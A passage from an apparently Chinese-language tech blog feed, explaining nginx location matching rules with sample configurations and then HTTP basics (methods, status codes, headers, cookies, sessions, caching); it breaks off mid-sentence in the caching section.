    <content type="html"><![CDATA[<h2 id="一、语法规则"><a href="#一、语法规则" class="headerlink" title="一、语法规则"></a>一、语法规则</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location [=|~|~*|^~] /uri/ &#123; … &#125;</span><br></pre></td></tr></table></figure><table><thead><tr><th>符号</th><th>含义</th></tr></thead><tbody><tr><td><code>=</code></td><td>开头表示精确匹配</td></tr><tr><td><code>^~</code></td><td>开头表示 uri 以某个常规字符串开头，理解为匹配 <code>url</code> 路径即可。<code>nginx</code> 不对 <code>url</code> 做编码，因此请求为<code>/static/20%/aa</code>，可以被规则<code>^~ /static/ /aa</code>匹配到（注意是空格）</td></tr><tr><td><code>~</code></td><td>开头表示区分大小写的正则匹配</td></tr><tr><td><code>~</code>*</td><td>开头表示不区分大小写的正则匹配</td></tr><tr><td><code>/</code></td><td>通用匹配，任何请求都会匹配到</td></tr></tbody></table><blockquote><p>多个 <code>location</code> 配置的情况下匹配顺序为</p></blockquote><ul><li>首先匹配 <code>=</code></li><li>其次匹配 <code>^~</code></li><li>其次是按文件中顺序的正则匹配</li><li>最后是交给 / 通用匹配</li><li>当有匹配成功时候，停止匹配，按当前匹配规则处理请求</li></ul><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">location</span> = / &#123;</span><br><span class="line">   <span class="comment">#规则A</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">location</span> = /login &#123;</span><br><span class="line">   <span class="comment">#规则B</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">location</span><span class="regexp"> ^~</span> /static/ &#123;</span><br><span class="line">   <span class="comment">#规则C</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">location</span> <span class="regexp">~ \.(gif|jpg|png|js|css)$</span> &#123;</span><br><span class="line">   <span class="comment">#规则D</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">location</span> <span class="regexp">~* \.png$</span> &#123;</span><br><span class="line">   <span class="comment">#规则E</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">location</span> / &#123;</span><br><span class="line">   <span class="comment">#规则F</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>那么产生的效果如下</p></blockquote><ul><li>访问根目录 <code>/</code>， 比如 <code>http://localhost/</code> 将匹配规则 <code>A</code></li><li>访问 <code>http://localhost/login</code> 将匹配规则 <code>B</code>，<code>http://localhost/register</code> 则匹配规则 <code>F</code></li><li>访问 <code>http://localhost/static/a.html</code> 将匹配规则 <code>C</code></li><li>访问 <code>http://localhost/a.gif</code>, <code>http://localhost/b.jpg</code> 将匹配规则 <code>D</code>和规则 <code>E</code>，但是规则 <code>D</code> 顺序优先，规则 <code>E</code>不起作用，而 <code>http://localhost/static/c.png</code>则优先匹配到规则 <code>C</code></li><li>访问 <code>http://localhost/a.PNG</code> 则匹配规则 <code>E</code>，而不会匹配规则 <code>D</code>，因为规则 <code>E</code> 不区分大小写</li></ul><blockquote><p>访问 <code>http://localhost/category/id/1111</code> 则最终匹配到规则 <code>F</code>，因为以上规则都不匹配，这个时候应该是 <code>nginx</code> 转发请求给后端应用服务器，比如 <code>FastCGI（PHP</code>），<code>tomcat（jsp）</code>，<code>nginx</code> 作为反向代理服务器存在</p></blockquote><h2 id="二、运用场景"><a href="#二、运用场景" class="headerlink" title="二、运用场景"></a>二、运用场景</h2><blockquote><p>实际使用中，至少有三个匹配规则定义，如下</p></blockquote><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 直接匹配网站根，通过域名访问网站首页比较频繁，使用这个会加速处理，官网如是说。</span></span><br><span class="line"><span class="comment"># 这里是直接转发给后端应用服务器了，也可以是一个静态首页</span></span><br><span class="line"><span class="comment"># 第一个必选规则</span></span><br><span class="line"><span class="attribute">location</span> = / &#123;</span><br><span class="line">    <span class="attribute">proxy_pass</span> http://tomcat:8080/index</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 第二个必选规则是处理静态文件请求，这是 nginx 作为 http 服务器的强项</span><br><span class="line"><span class="comment"># 有两种配置模式，目录匹配或后缀匹配，任选其一或搭配使用</span></span><br><span class="line">location<span class="regexp"> ^~</span> /static/ &#123;</span><br><span class="line">    <span class="attribute">root</span> /webroot/static/;</span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">location</span> <span class="regexp">~* \.(gif|jpg|jpeg|png|css|js|ico)$</span> &#123;</span><br><span class="line">    <span class="attribute">root</span> /webroot/res/;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第三个规则就是通用规则，用来转发动态请求到后端应用服务器</span></span><br><span class="line"><span class="comment"># 非静态文件请求就默认是动态请求，自己根据实际把握</span></span><br><span class="line"><span class="comment"># 毕竟目前的一些框架的流行，带.php、.jsp后缀的情况很少了</span></span><br><span class="line"><span class="attribute">location</span> / &#123;</span><br><span class="line">    <span class="attribute">proxy_pass</span> http://tomcat:8080/</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;一、语法规则&quot;&gt;&lt;a href=&quot;#一、语法规则&quot; class=&quot;headerlink&quot; title=&quot;一、语法规则&quot;&gt;&lt;/a&gt;一、语法规则&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gut
      
    
    </summary>
    
      <category term="Back-end" scheme="http://blog.poetries.top/categories/Back-end/"/>
    
    
      <category term="Nginx" scheme="http://blog.poetries.top/tags/Nginx/"/>
    
  </entry>
  
  <entry>
    <title>HTTP协议系列（一）</title>
    <link href="http://blog.poetries.top/2018/02/26/http-1/"/>
    <id>http://blog.poetries.top/2018/02/26/http-1/</id>
    <published>2018-02-26T15:20:43.000Z</published>
    <updated>2018-08-23T01:41:37.471Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-、基础概念"><a href="#一-、基础概念" class="headerlink" title="一 、基础概念"></a>一 、基础概念</h1><h2 id="1-1-Web-基础"><a href="#1-1-Web-基础" class="headerlink" title="1.1 Web 基础"></a>1.1 Web 基础</h2><ul><li><code>HTTP</code>（<code>HyperText Transfer Protocol</code>，超文本传输协议）。</li><li><code>WWW（World Wide Web）</code>的三种技术：<code>HTML</code>、<code>HTTP</code>、<code>URL</code>。</li><li><code>RFC</code>（<code>Request for Comments</code>，征求修正意见书），互联网的设计文档。</li></ul><h2 id="1-2-URL"><a href="#1-2-URL" class="headerlink" title="1.2 URL"></a>1.2 URL</h2><ul><li><code>URI（</code>Uniform Resource Indentifier`，统一资源标识符）</li><li><code>URL</code>（<code>Uniform Resource Locator</code>，统一资源定位符）</li><li><code>URN</code>（<code>Uniform Resource Name</code>，统一资源名称），例如 <code>urn:isbn:0-486-27557-4</code>。</li></ul><blockquote><p><code>URI</code> 包含 <code>URL</code> 和 <code>URN</code>，目前 <code>WEB</code> 只有 <code>URL</code> 比较流行，所以见到的基本都是 <code>URL</code>。</p></blockquote><p><img src="http://7xq6al.com1.z0.glb.clouddn.com/http-1.jpg" alt=""></p><h2 id="1-3-请求和响应报文"><a href="#1-3-请求和响应报文" class="headerlink" title="1.3 请求和响应报文"></a>1.3 请求和响应报文</h2><h3 id="1-3-1-请求报文"><a href="#1-3-1-请求报文" class="headerlink" title="1.3.1 请求报文"></a>1.3.1 请求报文</h3><p><img src="http://7xq6al.com1.z0.glb.clouddn.com/http2.png" alt=""></p><h3 id="1-3-2-响应报文"><a href="#1-3-2-响应报文" class="headerlink" title="1.3.2. 响应报文"></a>1.3.2. 响应报文</h3><p><img src="http://7xq6al.com1.z0.glb.clouddn.com/http-3.png" alt=""></p><h1 id="二、HTTP-方法"><a href="#二、HTTP-方法" class="headerlink" title="二、HTTP 方法"></a>二、HTTP 方法</h1><ul><li>客户端发送的  <strong>请求报文</strong>  第一行为请求行，包含了方法字段。</li></ul><h2 id="2-1-GET"><a href="#2-1-GET" class="headerlink" title="2.1 GET"></a>2.1 GET</h2><blockquote><p>获取资源</p></blockquote><ul><li>当前网络请求中，绝大部分使用的是 <code>GET</code> 方法。</li></ul><h2 id="2-2-HEAD"><a href="#2-2-HEAD" class="headerlink" title="2.2 HEAD"></a>2.2 HEAD</h2><blockquote><p>获取报文首部</p></blockquote><ul><li>和 <code>GET</code> 方法一样，但是不返回报文实体主体部分。</li><li>主要用于确认 <code>URL</code> 的有效性以及资源更新的日期时间等。</li></ul><h2 id="2-3-POST"><a href="#2-3-POST" class="headerlink" title="2.3 POST"></a>2.3 POST</h2><blockquote><p>传输实体主体</p></blockquote><ul><li><code>POST</code> 主要用来传输数据，而 <code>GET</code> 主要用来获取资源。</li></ul><h2 id="2-4-PUT"><a href="#2-4-PUT" class="headerlink" title="2.4 PUT"></a>2.4 PUT</h2><blockquote><p>上传文件</p></blockquote><ul><li>由于自身不带验证机制，任何人都可以上传文件，因此存在安全性问题，一般不使用该方法。</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PUT /new.html HTTP/1.1</span><br><span class="line">Host: example.com</span><br><span class="line">Content-type: text/html</span><br><span class="line">Content-length: 16</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>New File<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="2-5-PATCH"><a href="#2-5-PATCH" class="headerlink" title="2.5 PATCH"></a>2.5 PATCH</h2><blockquote><p>对资源进行部分修改</p></blockquote><ul><li><code>PUT</code> 也可以用于修改资源，但是只能完全替代原始资源，<code>PATCH</code> 允许部分修改。</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PATCH /file.txt HTTP/1.1</span><br><span class="line">Host: www.example.com</span><br><span class="line">Content-Type: application/example</span><br><span class="line">If-Match: "e0023aa4e"</span><br><span class="line">Content-Length: 100</span><br><span class="line"></span><br><span class="line">[description of changes]</span><br></pre></td></tr></table></figure><h2 id="2-6-DELETE"><a href="#2-6-DELETE" class="headerlink" title="2.6 DELETE"></a>2.6 DELETE</h2><blockquote><p>删除文件</p></blockquote><ul><li>与 <code>PUT</code> 功能相反，并且同样不带验证机制。</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DELETE /file.html HTTP/1.1</span><br></pre></td></tr></table></figure><h2 id="2-7-OPTIONS"><a href="#2-7-OPTIONS" class="headerlink" title="2.7 OPTIONS"></a>2.7 OPTIONS</h2><blockquote><p>查询支持的方法</p></blockquote><ul><li>查询指定的 <code>URL</code> 能够支持的方法。</li><li>会返回 <code>Allow: GET, POST, HEAD, OPTIONS</code> 这样的内容。</li></ul><h2 id="2-8-CONNECT"><a href="#2-8-CONNECT" class="headerlink" title="2.8 CONNECT"></a>2.8 CONNECT</h2><blockquote><p>要求用隧道协议连接代理</p></blockquote><ul><li>要求在与代理服务器通信时建立隧道，使用 <code>SSL</code>（<code>Secure Sockets Layer</code>，安全套接层）和 <code>TLS</code>（Transport Layer Security，传输层安全）协议把通信内容加密后经网络隧道传输。</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CONNECT www.example.com:443 HTTP/1.1</span><br></pre></td></tr></table></figure><p><img src="http://7xq6al.com1.z0.glb.clouddn.com/http-4.jpg" alt=""></p><h2 id="2-9-TRACE"><a href="#2-9-TRACE" class="headerlink" title="2.9 TRACE"></a>2.9 TRACE</h2><blockquote><p>追踪路径</p></blockquote><ul><li>服务器会将通信路径返回给客户端。</li><li>发送请求时，在 <code>Max-Forwards</code> 首部字段中填入数值，每经过一个服务器就会减 <code>1</code>，当数值为 <code>0</code> 时就停止传输。</li><li>通常不会使用 <code>TRACE</code>，并且它容易受到 <code>XST</code> 攻击（<code>Cross-Site Tracing</code>，跨站追踪），因此更不会去使用它。</li></ul><h1 id="三、HTTP-状态码"><a href="#三、HTTP-状态码" class="headerlink" title="三、HTTP 状态码"></a>三、HTTP 状态码</h1><blockquote><p>服务器返回的  <strong>响应报文</strong>  中第一行为状态行，包含了状态码以及原因短语，用来告知客户端请求的结果。</p></blockquote><table><thead><tr><th style="text-align:center">状态码</th><th style="text-align:center">类别</th><th style="text-align:center">原因短语</th></tr></thead><tbody><tr><td style="text-align:center"><code>1XX</code></td><td style="text-align:center"><code>Informational</code>（信息性状态码）</td><td style="text-align:center">接收的请求正在处理</td></tr><tr><td style="text-align:center"><code>2XX</code></td><td style="text-align:center"><code>Success</code>（成功状态码）</td><td style="text-align:center">请求正常处理完毕</td></tr><tr><td style="text-align:center"><code>3XX</code></td><td style="text-align:center"><code>Redirection</code>（重定向状态码）</td><td style="text-align:center">需要进行附加操作以完成请求</td></tr><tr><td style="text-align:center"><code>4XX</code></td><td style="text-align:center"><code>Client Error</code>（客户端错误状态码）</td><td style="text-align:center">服务器无法处理请求</td></tr><tr><td style="text-align:center"><code>5XX</code></td><td style="text-align:center"><code>Server Error</code>（服务器错误状态码）</td><td style="text-align:center">服务器处理请求出错</td></tr></tbody></table><h2 id="3-1-1XX-信息"><a href="#3-1-1XX-信息" class="headerlink" title="3.1 1XX 信息"></a>3.1 1XX 信息</h2><ul><li><strong>100 Continue</strong> ：表明到目前为止都很正常，客户端可以继续发送请求或者忽略这个响应。</li></ul><h2 id="3-2-2XX-成功"><a href="#3-2-2XX-成功" class="headerlink" title="3.2 2XX 成功"></a>3.2 2XX 成功</h2><ul><li><p><strong>200 OK</strong> </p></li><li><p><strong>204 No Content</strong> ：请求已经成功处理，但是返回的响应报文不包含实体的主体部分。一般在只需要从客户端往服务器发送信息，而不需要返回数据时使用。</p></li><li><p><strong>206 Partial Content</strong> ：表示客户端进行了范围请求。响应报文包含由 Content-Range 指定范围的实体内容。</p></li></ul><h2 id="3-3-3XX-重定向"><a href="#3-3-3XX-重定向" class="headerlink" title="3.3 3XX 重定向"></a>3.3 3XX 重定向</h2><ul><li><p><strong>301 Moved Permanently</strong> ：永久性重定向</p></li><li><p><strong>302 Found</strong> ：临时性重定向</p></li><li><p><strong>303 See Other</strong> ：和 302 有着相同的功能，但是 303 明确要求客户端应该采用 GET 方法获取资源。</p></li><li><p>注：虽然 HTTP 协议规定 301、302 状态下重定向时不允许把 POST 方法改成 GET 方法，但是大多数浏览器都会在 301、302 和 303 状态下的重定向把 POST 方法改成 GET 方法。</p></li><li><p><strong>304 Not Modified</strong> ：如果请求报文首部包含一些条件，例如：If-Match，If-ModifiedSince，If-None-Match，If-Range，If-Unmodified-Since，如果不满足条件，则服务器会返回 304 状态码。</p></li><li><p><strong>307 Temporary Redirect</strong> ：临时重定向，与 302 的含义类似，但是 307 要求浏览器不会把重定向请求的 POST 方法改成 GET 方法。</p></li></ul><h2 id="3-4-4XX-客户端错误"><a href="#3-4-4XX-客户端错误" class="headerlink" title="3.4 4XX 客户端错误"></a>3.4 4XX 客户端错误</h2><ul><li><p><strong>400 Bad Request</strong> ：请求报文中存在语法错误。</p></li><li><p><strong>401 Unauthorized</strong> ：该状态码表示发送的请求需要有认证信息（BASIC 认证、DIGEST 认证）。如果之前已进行过一次请求，则表示用户认证失败。</p></li><li><p><strong>403 Forbidden</strong> ：请求被拒绝，服务器端没有必要给出拒绝的详细理由。</p></li><li><p><strong>404 Not Found</strong> </p></li></ul><h2 id="3-5-5XX-服务器错误"><a href="#3-5-5XX-服务器错误" class="headerlink" title="3.5 5XX 服务器错误"></a>3.5 5XX 服务器错误</h2><ul><li><p><strong>500 Internal Server Error</strong> ：服务器正在执行请求时发生错误。</p></li><li><p><strong>503 Service Unavilable</strong> ：服务器暂时处于超负载或正在进行停机维护，现在无法处理请求。</p></li></ul><h1 id="四、HTTP-首部"><a href="#四、HTTP-首部" class="headerlink" title="四、HTTP 首部"></a>四、HTTP 首部</h1><blockquote><p>有 4 种类型的首部字段：通用首部字段、请求首部字段、响应首部字段和实体首部字段</p></blockquote><ul><li>各种首部字段及其含义如下（不需要全记，仅供查阅）：</li></ul><h2 id="4-1-通用首部字段"><a href="#4-1-通用首部字段" class="headerlink" title="4.1 通用首部字段"></a>4.1 通用首部字段</h2><table><thead><tr><th style="text-align:center">首部字段名</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center"><code>Cache-Control</code></td><td style="text-align:center">控制缓存的行为</td></tr><tr><td style="text-align:center"><code>Connection</code></td><td style="text-align:center">控制不再转发给代理的首部字段、管理持久连接</td></tr><tr><td style="text-align:center"><code>Date</code></td><td style="text-align:center">创建报文的日期时间</td></tr><tr><td style="text-align:center"><code>Pragma</code></td><td style="text-align:center">报文指令</td></tr><tr><td style="text-align:center"><code>Trailer</code></td><td style="text-align:center">报文末端的首部一览</td></tr><tr><td style="text-align:center"><code>Transfer-Encoding</code></td><td style="text-align:center">指定报文主体的传输编码方式</td></tr><tr><td style="text-align:center"><code>Upgrade</code></td><td style="text-align:center">升级为其他协议</td></tr><tr><td style="text-align:center"><code>Via</code></td><td style="text-align:center">代理服务器的相关信息</td></tr><tr><td style="text-align:center"><code>Warning</code></td><td style="text-align:center">错误通知</td></tr></tbody></table><h2 id="4-2-请求首部字段"><a href="#4-2-请求首部字段" class="headerlink" title="4.2 请求首部字段"></a>4.2 请求首部字段</h2><table><thead><tr><th style="text-align:center">首部字段名</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center"><code>Accept</code></td><td style="text-align:center">用户代理可处理的媒体类型</td></tr><tr><td style="text-align:center"><code>Accept-Charset</code></td><td style="text-align:center">优先的字符集</td></tr><tr><td style="text-align:center"><code>Accept-Encoding</code></td><td style="text-align:center">优先的内容编码</td></tr><tr><td style="text-align:center"><code>Accept-Language</code></td><td style="text-align:center">优先的语言（自然语言）</td></tr><tr><td style="text-align:center"><code>Authorization</code></td><td style="text-align:center"><code>Web</code> 认证信息</td></tr><tr><td style="text-align:center"><code>Expect</code></td><td style="text-align:center">期待服务器的特定行为</td></tr><tr><td style="text-align:center"><code>From</code></td><td style="text-align:center">用户的电子邮箱地址</td></tr><tr><td style="text-align:center"><code>Host</code></td><td style="text-align:center">请求资源所在服务器</td></tr><tr><td style="text-align:center"><code>If-Match</code></td><td style="text-align:center">比较实体标记（<code>ETag</code>）</td></tr><tr><td style="text-align:center"><code>If-Modified-Since</code></td><td style="text-align:center">比较资源的更新时间</td></tr><tr><td style="text-align:center"><code>If-None-Match</code></td><td style="text-align:center">比较实体标记（与 <code>If-Match</code> 相反）</td></tr><tr><td style="text-align:center"><code>If-Range</code></td><td style="text-align:center">资源未更新时发送实体 <code>Byte</code> 的范围请求</td></tr><tr><td style="text-align:center"><code>If-Unmodified-Since</code></td><td style="text-align:center">比较资源的更新时间（与 <code>If-Modified-Since</code>相反）</td></tr><tr><td style="text-align:center"><code>Max-Forwards</code></td><td style="text-align:center">最大传输逐跳数</td></tr><tr><td style="text-align:center"><code>Proxy-Authorization</code></td><td style="text-align:center">代理服务器要求客户端的认证信息</td></tr><tr><td style="text-align:center"><code>Range</code></td><td style="text-align:center">实体的字节范围请求</td></tr><tr><td style="text-align:center"><code>Referer</code></td><td style="text-align:center">对请求中 <code>URI</code> 的原始获取方</td></tr><tr><td style="text-align:center"><code>TE</code></td><td style="text-align:center">传输编码的优先级</td></tr><tr><td style="text-align:center"><code>User-Agent</code></td><td style="text-align:center"><code>HTTP</code> 客户端程序的信息</td></tr></tbody></table><h2 id="4-3-响应首部字段"><a href="#4-3-响应首部字段" class="headerlink" title="4.3 响应首部字段"></a>4.3 响应首部字段</h2><table><thead><tr><th style="text-align:center">首部字段名</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center"><code>Accept-Ranges</code></td><td style="text-align:center">是否接受字节范围请求</td></tr><tr><td style="text-align:center"><code>Age</code></td><td style="text-align:center">推算资源创建经过时间</td></tr><tr><td style="text-align:center"><code>ETag</code></td><td style="text-align:center">资源的匹配信息</td></tr><tr><td style="text-align:center"><code>Location</code></td><td style="text-align:center">令客户端重定向至指定 <code>URI</code></td></tr><tr><td style="text-align:center"><code>Proxy-Authenticate</code></td><td style="text-align:center">代理服务器对客户端的认证信息</td></tr><tr><td style="text-align:center"><code>Retry-After</code></td><td style="text-align:center">对再次发起请求的时机要求</td></tr><tr><td style="text-align:center"><code>Server</code></td><td style="text-align:center"><code>HTTP</code> 服务器的安装信息</td></tr><tr><td style="text-align:center"><code>Vary</code></td><td style="text-align:center">代理服务器缓存的管理信息</td></tr><tr><td style="text-align:center"><code>WWW-Authenticate</code></td><td style="text-align:center">服务器对客户端的认证信息</td></tr></tbody></table><h2 id="4-4-实体首部字段"><a href="#4-4-实体首部字段" class="headerlink" title="4.4 实体首部字段"></a>4.4 实体首部字段</h2><table><thead><tr><th style="text-align:center">首部字段名</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center"><code>Allow</code></td><td style="text-align:center">资源可支持的 <code>HTTP</code>方法</td></tr><tr><td style="text-align:center"><code>Content-Encoding</code></td><td style="text-align:center">实体主体适用的编码方式</td></tr><tr><td style="text-align:center"><code>Content-Language</code></td><td style="text-align:center">实体主体的自然语言</td></tr><tr><td style="text-align:center"><code>Content-Length</code></td><td style="text-align:center">实体主体的大小</td></tr><tr><td style="text-align:center"><code>Content-Location</code></td><td style="text-align:center">替代对应资源的 <code>URI</code></td></tr><tr><td style="text-align:center"><code>Content-MD5</code></td><td style="text-align:center">实体主体的报文摘要</td></tr><tr><td style="text-align:center"><code>Content-Range</code></td><td style="text-align:center">实体主体的位置范围</td></tr><tr><td style="text-align:center"><code>Content-Type</code></td><td style="text-align:center">实体主体的媒体类型</td></tr><tr><td style="text-align:center"><code>Expires</code></td><td style="text-align:center">实体主体过期的日期时间</td></tr><tr><td style="text-align:center"><code>Last-Modified</code></td><td style="text-align:center">资源的最后修改日期时间</td></tr></tbody></table><h1 id="五、具体应用"><a href="#五、具体应用" class="headerlink" title="五、具体应用"></a>五、具体应用</h1><h2 id="5-1-Cookie"><a href="#5-1-Cookie" class="headerlink" title="5.1 Cookie"></a>5.1 Cookie</h2><ul><li><code>HTTP</code> 协议是无状态的，主要是为了让 <code>HTTP</code> 协议尽可能简单，使得它能够处理大量事务。<code>HTTP/1.1</code> 引入 <code>Cookie</code> 来保存状态信息。</li><li><code>Cookie</code> 是服务器发送给客户端的数据，该数据会被保存在浏览器中，并且客户端的下一次请求报文会包含该数据。通过 <code>Cookie</code> 可以让服务器知道两个请求是否来自于同一个客户端，从而实现保持登录状态等功能。</li></ul><h3 id="5-1-1-创建过程"><a href="#5-1-1-创建过程" class="headerlink" title="5.1.1 创建过程"></a>5.1.1 创建过程</h3><ul><li>服务器发送的响应报文包含 <code>Set-Cookie</code> 字段，客户端得到响应报文后把 <code>Cookie</code> 内容保存到浏览器中</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.0 200 OK</span><br><span class="line">Content-type: text/html</span><br><span class="line">Set-Cookie: yummy_cookie=choco</span><br><span class="line">Set-Cookie: tasty_cookie=strawberry</span><br><span class="line"></span><br><span class="line">[page content]</span><br></pre></td></tr></table></figure><ul><li>客户端之后发送请求时，会从浏览器中读出 <code>Cookie</code> 值，在请求报文中包含 <code>Cookie</code> 字段</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /sample_page.html HTTP/1.1</span><br><span class="line">Host: www.example.org</span><br><span class="line">Cookie: yummy_cookie=choco; tasty_cookie=strawberry</span><br></pre></td></tr></table></figure><h3 id="5-1-2-分类"><a href="#5-1-2-分类" class="headerlink" title="5.1.2 分类"></a>5.1.2 分类</h3><ul><li>会话期 <code>Cookie</code>：浏览器关闭之后它会被自动删除，也就是说它仅在会话期内有效。</li><li>持久性 <code>Cookie</code>：指定一个特定的过期时间（<code>Expires</code>）或有效期（<code>Max-Age</code>）之后就成为了持久性的 <code>Cookie</code>。</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;</span><br></pre></td></tr></table></figure><h3 id="5-1-3-Set-Cookie"><a href="#5-1-3-Set-Cookie" class="headerlink" title="5.1.3 Set-Cookie"></a>5.1.3 Set-Cookie</h3><table><thead><tr><th style="text-align:center">属性</th><th>说明</th></tr></thead><tbody><tr><td style="text-align:center"><code>NAME=VALUE</code></td><td>赋予 <code>Cookie</code> 的名称和其值（必需项）</td></tr><tr><td style="text-align:center"><code>expires=DATE</code></td><td><code>Cookie</code> 的有效期（若不明确指定则默认为浏览器关闭前为止）</td></tr><tr><td style="text-align:center"><code>path=PATH</code></td><td>将服务器上的文件目录作为 <code>Cookie</code> 的适用对象（若不指定则默认为文档所在的文件目录）</td></tr><tr><td style="text-align:center"><code>domain=域名</code></td><td>作为 <code>Cookie</code> 适用对象的域名（若不指定则默认为创建 Cookie 的服务器的域名）</td></tr><tr><td style="text-align:center"><code>Secure</code></td><td>仅在 <code>HTTPs</code> 安全通信时才会发送 <code>Cookie</code></td></tr><tr><td style="text-align:center"><code>HttpOnly</code></td><td>加以限制，使 <code>Cookie</code> 不能被 <code>JavaScript</code> 脚本访问</td></tr></tbody></table><h3 id="5-1-4-Session-和-Cookie-区别"><a href="#5-1-4-Session-和-Cookie-区别" class="headerlink" title="5.1.4 Session 和 Cookie 区别"></a>5.1.4 Session 和 Cookie 区别</h3><blockquote><p><code>Session</code> 是服务器用来跟踪用户的一种手段，每个 Session 都有一个唯一标识：Session ID。当服务器创建了一个 Session 时，给客户端发送的响应报文包含了 Set-Cookie 字段，其中有一个名为 sid 的键值对，这个键值对就是 Session ID。客户端收到后就把 Cookie 保存在浏览器中，并且之后发送的请求报文都包含 Session ID。HTTP 就是通过 Session 和 Cookie 这两种方式一起合作来实现跟踪用户状态的，Session 用于服务器端，Cookie 用于客户端。</p></blockquote><h3 id="5-1-5-浏览器禁用-Cookie-的情况"><a href="#5-1-5-浏览器禁用-Cookie-的情况" class="headerlink" title="5.1.5 浏览器禁用 Cookie 的情况"></a>5.1.5 浏览器禁用 Cookie 的情况</h3><blockquote><p>会使用 <code>URL</code> 重写技术，在 <code>URL</code> 后面加上 <code>sid=xxx</code> 。</p></blockquote><h3 id="5-1-6-使用-Cookie-实现用户名和密码的自动填写"><a href="#5-1-6-使用-Cookie-实现用户名和密码的自动填写" class="headerlink" title="5.1.6 使用 Cookie 实现用户名和密码的自动填写"></a>5.1.6 使用 Cookie 实现用户名和密码的自动填写</h3><ul><li>网站脚本会自动从保存在浏览器中的 <code>Cookie</code> 读取用户名和密码，从而实现自动填写。</li><li>但是如果 <code>Set-Cookie</code> 指定了 <code>HttpOnly</code>属性，就无法通过 <code>Javascript</code>脚本获取 <code>Cookie</code>信息，这是出于安全性考虑。</li></ul><h2 id="5-2-缓存"><a href="#5-2-缓存" class="headerlink" title="5.2 缓存"></a>5.2 缓存</h2><h3 id="5-2-1-优点"><a href="#5-2-1-优点" class="headerlink" title="5.2.1 优点"></a>5.2.1 优点</h3><ul><li>降低服务器的负担；</li><li>提高响应速度（缓存资源比服务器上的资源离客户端更近）</li></ul><h3 id="5-2-2-实现方法"><a href="#5-2-2-实现方法" class="headerlink" title="5.2.2 实现方法"></a>5.2.2 实现方法</h3><ul><li>让代理服务器进行缓存</li><li>让客户端浏览器进行缓存</li></ul><h3 id="5-2-3-Cache-Control-字段"><a href="#5-2-3-Cache-Control-字段" class="headerlink" title="5.2.3 Cache-Control 字段"></a>5.2.3 Cache-Control 字段</h3><ul><li><code>HTTP</code> 通过 <code>Cache-Control</code> 首部字段来控制缓存。</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cache-Control: private, max-age=0, no-cache</span><br></pre></td></tr></table></figure><h3 id="5-2-4-no-cache-指令"><a href="#5-2-4-no-cache-指令" class="headerlink" title="5.2.4 no-cache 指令"></a>5.2.4 no-cache 指令</h3><ul><li>该指令出现在请求报文的 <code>Cache-Control</code> 